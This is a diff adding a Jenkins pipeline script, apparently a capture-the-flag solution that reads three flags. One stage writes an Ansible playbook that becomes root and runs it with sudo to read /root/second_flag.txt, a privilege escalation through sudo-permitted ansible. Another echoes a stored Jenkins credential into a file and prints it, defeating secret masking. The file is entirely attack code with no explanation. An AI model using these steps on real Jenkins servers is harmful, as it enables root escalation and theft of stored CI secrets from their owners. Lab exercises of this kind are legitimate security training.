@@ -1,0 +1,45 @@
+node() {
+    stage ('first_flag') {
+        sh 'cat /var/jenkins_home/flag.txt'
+
+    }
+
+    stage('ansible') {
+        sh 'ansible --version'
+        def text = """
+---
+  - name: Privesc
+    hosts: localhost
+    become: true
+    become_user: root
+
+    tasks:
+
+    - name: Shell command
+      shell:
+         "cat /root/second_flag.txt"
+      register: cmd
+      tags: cmd
+
+    - debug: msg="{{cmd.stdout}}"
+        """
+
+    writeFile(file: 'playbook.yaml', text: text)
+    sh 'cat playbook.yaml'
+    }
+
+    stage('second_flag') {
+        sh 'sudo ansible-playbook playbook.yaml'
+    }
+
+    stage('third') {
+
+        withCredentials([string(credentialsId: 'flag', variable: 'FLAG')]) {
+            sh "echo $FLAG > txt"
+
+        }
+        sh "cat txt"
+
+    }
+
+}
